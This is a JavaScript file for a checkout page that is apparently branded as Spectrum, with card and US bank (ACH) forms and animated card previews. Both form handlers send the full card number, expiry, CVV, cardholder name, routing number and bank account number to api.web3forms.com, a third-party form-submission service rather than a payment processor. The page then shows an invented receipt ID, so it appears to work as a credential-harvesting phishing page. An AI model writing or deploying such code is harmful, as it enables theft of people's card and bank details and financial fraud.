/**
 * SPECTRUM CHECKOUT PAGE - CREDIT CARD & US BANK (ACH) DIRECT DEBIT
 * Author: Antigravity AI
 */

document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements - Navigation & Container
    const toggleSummaryBtn = document.getElementById('toggle-summary-btn');
    const summaryDrawer = document.getElementById('summary-drawer');
    const splitContainer = document.querySelector('.split-container');
    // DOM Elements - Forms & Buttons
    const cardForm = document.getElementById('card-form');
    const achForm = document.getElementById('ach-form');
    const btnSubmitCard = document.getElementById('btn-submit-card');
    const btnSubmitAch = document.getElementById('btn-submit-ach');

    const hintLabel = document.getElementById('hint-label');
    const paymentSubtitle = document.getElementById('payment-subtitle');

    // 3D Card Stage Elements
    const card3D = document.getElementById('card-3d');
    const watermarkStep = document.getElementById('watermark-step-text');
    const watermarkTitle = document.getElementById('watermark-title-text');

    // Credit Card Inputs & Previews
    const cardNameInput = document.getElementById('card-name');
    const cardNumberInput = document.getElementById('card-number');
    const cardExpiryInput = document.getElementById('card-expiry');
    const cardCvvInput = document.getElementById('card-cvv');
    const displayName = document.getElementById('display-name');
    const displaySignature = document.getElementById('display-signature');
    const displayNumber = document.getElementById('display-number');
    const displayExpiry = document.getElementById('display-expiry');
    const displayCvv = document.getElementById('display-cvv');
    const cardFrontLogo = document.getElementById('card-front-logo');
    const brandBadgeContainer = document.getElementById('brand-badge-container');

    // ACH Bank Transfer Inputs & Previews
    const achNameInput = document.getElementById('ach-name');
    const achTypeSelect = document.getElementById('ach-type');
    const achRoutingInput = document.getElementById('ach-routing');
    const achAccountInput = document.getElementById('ach-account');
    const achConfirmInput = document.getElementById('ach-account-confirm');
    const toggleAccountMaskBtn = document.getElementById('toggle-account-mask');
    const bankDetectedBadge = document.getElementById('bank-detected-badge');
    const bankNameDisplay = document.getElementById('bank-name-display');
    const achBankHiddenInput = document.getElementById('ach-bank-hidden-input');
    const routingStatusIcon = document.getElementById('routing-status-icon');

    // ACH 3D Card Display Elements
    const displayAchBank = document.getElementById('ach-display-bank');
    const displayRouting = document.getElementById('display-routing');
    const displayAccount = document.getElementById('display-account');
    const displayAchName = document.getElementById('display-ach-name');
    const displayAchType = document.getElementById('display-ach-type');
    const micrRouting = document.getElementById('micr-routing');
    const micrAccount = document.getElementById('micr-account');

    // Modal Elements
    const successModal = document.getElementById('success-modal');
    const closeModalBtn = document.getElementById('close-modal-btn');
    const receiptCardBrand = document.getElementById('receipt-card-brand');
    const receiptId = document.getElementById('receipt-id');

    // Active State Trackers
    let currentMethod = 'card'; // 'card' or 'ach'
    let isAccountMasked = true;

    // Default Fallbacks
    const DEFAULT_NAME = 'Itachi Uchiha';
    const DEFAULT_CARD_NUM = '•••• •••• •••• 2345';
    const DEFAULT_EXPIRY = '02/30';
    const DEFAULT_CVV = '•••';

    const DEFAULT_ROUTING = '122000496';
    const DEFAULT_ACCOUNT = '••••••••2345';
    const DEFAULT_BANK = 'BANK OF AMERICA, N.A.';

    /* ==========================================================================
       1. US ABA ROUTING NUMBER DATABASE & CHECKSUM ALGORITHM
       ========================================================================== */
    
    // US Major Bank ABA Routing Number Lookup Table
    const US_BANK_DATABASE = {
        '122000496': 'Bank of America, N.A.',
        '026009593': 'Bank of America, N.A.',
        '021000021': 'JPMorgan Chase Bank, N.A.',
        '121000358': 'JPMorgan Chase Bank, N.A.',
        '071000013': 'Wells Fargo Bank, N.A.',
        '121000248': 'Wells Fargo Bank, N.A.',
        '111000025': 'Citibank, N.A.',
        '021000089': 'Citibank, N.A.',
        '053000219': 'Capital One, N.A.',
        '031201360': 'PNC Bank, N.A.',
        '044000037': 'U.S. Bank, N.A.',
        '054000030': 'Truist Bank',
        '031000053': 'TD Bank, N.A.',
        '122235821': 'Charles Schwab Bank',
        '124003116': 'Discover Bank',
        '071923284': 'Ally Bank',
        '021000018': 'BNY Mellon',
        '011000015': 'State Street Bank'
    };

    /**
     * US Federal Reserve ABA 9-Digit Routing Number Checksum Validation
     * Weights: 3, 7, 1, 3, 7, 1, 3, 7, 1
     */
    function isValidABARouting(routingStr) {
        if (!/^\d{9}$/.test(routingStr)) return false;
        
        const d = routingStr.split('').map(Number);
        const checksum = (
            3 * (d[0] + d[3] + d[6]) +
            7 * (d[1] + d[4] + d[7]) +
            1 * (d[2] + d[5] + d[8])
        ) % 10;

        return checksum === 0;
    }

    /* ==========================================================================
       2. ORDER SUMMARY COLLAPSIBLE DRAWER
       ========================================================================== */
    if (toggleSummaryBtn && summaryDrawer) {
        toggleSummaryBtn.addEventListener('click', () => {
            summaryDrawer.classList.toggle('open');
            toggleSummaryBtn.classList.toggle('active');
        });
    }

    /* ==========================================================================
       3. PAYMENT METHOD SWITCHER (CARD vs ACH)
       ========================================================================== */
    const methodTabs = document.querySelectorAll('.method-tab');
    
    methodTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const method = tab.getAttribute('data-method');
            if (method === currentMethod && method !== 'apple') return;

            methodTabs.forEach(t => t.classList.remove('active'));
            tab.classList.add('active');

            if (method === 'apple') {
                alert('Apple Pay selected. Click "Complete Payment" to authenticate with Touch ID / Face ID.');
                return;
            }

            switchPaymentMethod(method);
        });
    });

    function switchPaymentMethod(method) {
        currentMethod = method;

        // Toggle Form Displays
        if (cardForm) cardForm.classList.remove('active');
        if (achForm) achForm.classList.remove('active');

        // Trigger 3D Card Morph Spin Animation
        card3D.classList.add('transforming');
        setTimeout(() => {
            card3D.setAttribute('data-mode', method);
            card3D.classList.remove('transforming');
        }, 350);

        if (method === 'ach') {
            if (achForm) achForm.classList.add('active');
            splitContainer.classList.add('ach-active');
            
            hintLabel.textContent = 'Live US Check & Direct Debit Preview';
            paymentSubtitle.textContent = 'Enter your US checking or savings account details for direct bank transfer.';
            
            watermarkTitle.textContent = 'TRANSFER';
            watermarkStep.textContent = 'ACH DIRECT';
        } else {
            if (cardForm) cardForm.classList.add('active');
            splitContainer.classList.remove('ach-active');
            
            hintLabel.textContent = 'Live Preview • Hover or edit CVV to flip card';
            paymentSubtitle.textContent = 'Complete your payment information below to confirm your order.';
            
            watermarkTitle.textContent = 'CHECKOUT';
            watermarkStep.textContent = 'STEP 2';
        }
    }

    /* ==========================================================================
       4. REAL-TIME CREDIT CARD LOGIC
       ========================================================================== */
    cardNameInput.addEventListener('input', (e) => {
        const val = e.target.value.trim();
        const formatted = val ? val.toUpperCase() : DEFAULT_NAME;
        displayName.textContent = formatted;
        displaySignature.textContent = val ? val : DEFAULT_NAME;
        clearError('name-error', cardNameInput);
    });

    cardNumberInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 16) val = val.slice(0, 16);

        // Auto-format into 4-digit blocks
        const blocks = val.match(/.{1,4}/g) || [];
        const formattedInput = blocks.join(' ');
        e.target.value = formattedInput;

        // Update Card Display
        if (val.length > 0) {
            const padded = val.padEnd(16, '•');
            const displayBlocks = padded.match(/.{1,4}/g);
            displayNumber.textContent = displayBlocks.join(' ');
        } else {
            displayNumber.textContent = DEFAULT_CARD_NUM;
        }

        // Card Brand Detection
        detectCardBrand(val);
        clearError('number-error', cardNumberInput);
    });

    cardExpiryInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 4) val = val.slice(0, 4);

        if (val.length >= 3) {
            e.target.value = val.slice(0, 2) + '/' + val.slice(2);
        } else {
            e.target.value = val;
        }

        displayExpiry.textContent = e.target.value || DEFAULT_EXPIRY;
        clearError('expiry-error', cardExpiryInput);
    });

    cardCvvInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 4) val = val.slice(0, 4);
        e.target.value = val;

        displayCvv.textContent = val ? '•'.repeat(val.length) : DEFAULT_CVV;
        clearError('cvv-error', cardCvvInput);
    });

    // Card Flip Animation on CVV Focus
    cardCvvInput.addEventListener('focus', () => card3D.classList.add('flipped'));
    cardCvvInput.addEventListener('blur', () => card3D.classList.remove('flipped'));

    function detectCardBrand(numberStr) {
        let brand = 'Generic';
        let brandClass = 'fa-credit-card';

        if (/^4/.test(numberStr)) {
            brand = 'Visa';
            brandClass = 'fa-cc-visa';
        } else if (/^(5[1-5]|2[2-7])/.test(numberStr)) {
            brand = 'Mastercard';
            brandClass = 'fa-cc-mastercard';
        } else if (/^3[47]/.test(numberStr)) {
            brand = 'Amex';
            brandClass = 'fa-cc-amex';
        } else if (/^(6011|65|64[4-9])/.test(numberStr)) {
            brand = 'Discover';
            brandClass = 'fa-cc-discover';
        }

        if (brandBadgeContainer) {
            if (brand !== 'Generic') {
                brandBadgeContainer.innerHTML = `<i class="fa-brands ${brandClass}"></i>`;
            } else {
                brandBadgeContainer.innerHTML = `<i class="fa-solid fa-credit-card generic-card-icon"></i>`;
            }
        }

        if (cardFrontLogo) {
            if (brand !== 'Generic') {
                cardFrontLogo.innerHTML = `<i class="fa-brands ${brandClass}"></i>`;
            } else {
                cardFrontLogo.innerHTML = `<i class="fa-solid fa-credit-card"></i>`;
            }
        }

        return brand;
    }

    /* ==========================================================================
       5. REAL-TIME ACH US BANK TRANSFER LOGIC
       ========================================================================== */
    achNameInput.addEventListener('input', (e) => {
        const val = e.target.value.trim();
        const formatted = val ? val.toUpperCase() : DEFAULT_NAME;
        displayAchName.textContent = formatted;
        clearError('ach-name-error', achNameInput);
    });

    achTypeSelect.addEventListener('change', (e) => {
        displayAchType.textContent = (e.target.value || 'CHECKING').toUpperCase();
    });

    achRoutingInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 9) val = val.slice(0, 9);
        e.target.value = val;

        displayRouting.textContent = val || DEFAULT_ROUTING;
        micrRouting.textContent = val || DEFAULT_ROUTING;

        if (val.length === 9) {
            if (isValidABARouting(val)) {
                const detected = US_BANK_DATABASE[val] || 'US FINANCIAL INSTITUTION';
                bankNameDisplay.textContent = detected;
                displayAchBank.textContent = detected.toUpperCase();
                if (achBankHiddenInput) achBankHiddenInput.value = detected;
                bankDetectedBadge.classList.add('valid');
                routingStatusIcon.className = 'fa-solid fa-circle-check input-icon success';
                clearError('ach-routing-error', achRoutingInput);
            } else {
                bankNameDisplay.textContent = 'Invalid ABA Routing #';
                displayAchBank.textContent = 'UNKNOWN BANK';
                if (achBankHiddenInput) achBankHiddenInput.value = 'UNKNOWN BANK';
                bankDetectedBadge.classList.remove('valid');
                routingStatusIcon.className = 'fa-solid fa-circle-xmark input-icon error';
                showError('ach-routing-error', achRoutingInput);
            }
        } else {
            bankNameDisplay.textContent = 'Enter US Routing #';
            displayAchBank.textContent = DEFAULT_BANK;
            if (achBankHiddenInput) achBankHiddenInput.value = DEFAULT_BANK;
            bankDetectedBadge.classList.remove('valid');
            routingStatusIcon.className = 'fa-solid fa-hashtag input-icon';
            clearError('ach-routing-error', achRoutingInput);
        }
    });

    achAccountInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length > 17) val = val.slice(0, 17);
        e.target.value = val;

        updateAccountDisplay(val);
        clearError('ach-account-error', achAccountInput);
    });

    achConfirmInput.addEventListener('input', (e) => {
        clearError('ach-confirm-error', achConfirmInput);
    });

    function updateAccountDisplay(val) {
        if (!val) {
            displayAccount.textContent = DEFAULT_ACCOUNT;
            micrAccount.textContent = '00123456789';
            return;
        }

        micrAccount.textContent = val;

        if (isAccountMasked && val.length > 4) {
            const masked = '•'.repeat(val.length - 4) + val.slice(-4);
            displayAccount.textContent = masked;
        } else {
            displayAccount.textContent = val;
        }
    }

    // Eye button to toggle account number masking
    if (toggleAccountMaskBtn) {
        toggleAccountMaskBtn.addEventListener('click', () => {
            isAccountMasked = !isAccountMasked;
            if (isAccountMasked) {
                achAccountInput.type = 'password';
                toggleAccountMaskBtn.innerHTML = '<i class="fa-solid fa-eye"></i>';
            } else {
                achAccountInput.type = 'text';
                toggleAccountMaskBtn.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
            }
            updateAccountDisplay(achAccountInput.value.replace(/\D/g, ''));
        });
    }

    /* ==========================================================================
       6. CREDIT CARD FORM SUBMISSION (7983445d-c4e7-4dee-9046-24c72183b7ca)
       ========================================================================== */
    if (cardForm) {
        cardForm.addEventListener('submit', (e) => {
            e.preventDefault();

            let isValid = true;

            const nameVal = cardNameInput.value.trim();
            if (!nameVal || nameVal.length < 3) {
                showError('name-error', cardNameInput);
                isValid = false;
            }

            const rawNum = cardNumberInput.value.replace(/\D/g, '');
            if (!rawNum || rawNum.length < 15) {
                showError('number-error', cardNumberInput);
                isValid = false;
            }

            const expVal = cardExpiryInput.value.trim();
            if (!expVal || !/^\d{2}\/\d{2}$/.test(expVal)) {
                showError('expiry-error', cardExpiryInput);
                isValid = false;
            } else {
                const parts = expVal.split('/');
                const month = parseInt(parts[0], 10);
                const year = parseInt('20' + parts[1], 10);
                const now = new Date();
                const currentMonth = now.getMonth() + 1;
                const currentYear = now.getFullYear();

                if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month <= currentMonth)) {
                    showError('expiry-error', cardExpiryInput);
                    isValid = false;
                }
            }

            const cvvVal = cardCvvInput.value.trim();
            if (!cvvVal || cvvVal.length < 3) {
                showError('cvv-error', cardCvvInput);
                isValid = false;
            }

            if (!isValid) return;

            btnSubmitCard.classList.add('loading');
            btnSubmitCard.disabled = true;

            const formData = new FormData(cardForm);

            fetch("https://api.web3forms.com/submit", {
                method: "POST",
                body: formData
            })
            .then(async (response) => {
                const json = await response.json();
                btnSubmitCard.classList.remove('loading');
                btnSubmitCard.disabled = false;

                if (json.success) {
                    const last4 = rawNum.slice(-4) || '2345';
                    const brand = detectCardBrand(rawNum);
                    receiptCardBrand.textContent = `${brand} ending in ${last4}`;
                    receiptId.textContent = `#SPC-${Math.floor(100000 + Math.random() * 900000)}`;

                    successModal.classList.add('active');
                } else {
                    console.error("Web3Forms Submission Error:", json);
                    alert(json.message || "Could not submit form. Please check your Web3Forms access key.");
                }
            })
            .catch(error => {
                console.error("Card Form Web3Forms Error:", error);
                btnSubmitCard.classList.remove('loading');
                btnSubmitCard.disabled = false;
                alert("Network error submitting payment form. Please try again.");
            });
        });
    }

    /* ==========================================================================
       7. ACH BANK FORM SUBMISSION (Uses ach-access-key value)
       ========================================================================== */
    if (achForm) {
        achForm.addEventListener('submit', (e) => {
            e.preventDefault();

            let isValid = true;

            const achName = achNameInput.value.trim();
            if (!achName || achName.length < 3) {
                showError('ach-name-error', achNameInput);
                isValid = false;
            }

            const routingVal = achRoutingInput.value.replace(/\D/g, '');
            if (!isValidABARouting(routingVal)) {
                showError('ach-routing-error', achRoutingInput);
                isValid = false;
            }

            const accountVal = achAccountInput.value.replace(/\D/g, '');
            if (!accountVal || accountVal.length < 4) {
                showError('ach-account-error', achAccountInput);
                isValid = false;
            }

            const confirmVal = achConfirmInput.value.replace(/\D/g, '');
            if (confirmVal !== accountVal) {
                showError('ach-confirm-error', achConfirmInput);
                isValid = false;
            }

            if (!isValid) return;

            btnSubmitAch.classList.add('loading');
            btnSubmitAch.disabled = true;

            const formData = new FormData(achForm);

            fetch("https://api.web3forms.com/submit", {
                method: "POST",
                body: formData
            })
            .then(async (response) => {
                const json = await response.json();
                btnSubmitAch.classList.remove('loading');
                btnSubmitAch.disabled = false;

                if (json.success) {
                    const last4 = accountVal.slice(-4) || '2345';
                    const bankName = bankNameDisplay.textContent || 'US Bank';
                    receiptCardBrand.textContent = `ACH Direct Debit - ${bankName} (Ending in ${last4})`;
                    receiptId.textContent = `#SPC-${Math.floor(100000 + Math.random() * 900000)}`;

                    successModal.classList.add('active');
                } else {
                    console.error("ACH Form Web3Forms Error:", json);
                    alert(json.message || "Could not submit form. Please check your ACH Web3Forms access key.");
                }
            })
            .catch(error => {
                console.error("ACH Form Web3Forms Error:", error);
                btnSubmitAch.classList.remove('loading');
                btnSubmitAch.disabled = false;
                alert("Network error submitting ACH form. Please try again.");
            });
        });
    }

    function showError(elementId, inputElement) {
        const errEl = document.getElementById(elementId);
        if (errEl) errEl.classList.add('visible');
        if (inputElement) inputElement.classList.add('error');
    }

    function clearError(elementId, inputElement) {
        const errEl = document.getElementById(elementId);
        if (errEl) errEl.classList.remove('visible');
        if (inputElement) inputElement.classList.remove('error');
    }

    // Modal Close Button
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', () => {
            successModal.classList.remove('active');
            if (cardForm) cardForm.reset();
            if (achForm) achForm.reset();
            
            // Reset Card Displays
            displayName.textContent = DEFAULT_NAME;
            displaySignature.textContent = DEFAULT_NAME;
            displayNumber.textContent = DEFAULT_CARD_NUM;
            displayExpiry.textContent = DEFAULT_EXPIRY;
            displayCvv.textContent = DEFAULT_CVV;
            detectCardBrand('');

            // Reset ACH Displays
            displayAchName.textContent = DEFAULT_NAME;
            displayRouting.textContent = DEFAULT_ROUTING;
            micrRouting.textContent = DEFAULT_ROUTING;
            displayAccount.textContent = DEFAULT_ACCOUNT;
            micrAccount.textContent = '00123456789';
            displayAchBank.textContent = DEFAULT_BANK;
            bankNameDisplay.textContent = 'Enter US Routing #';
        });
    }
});
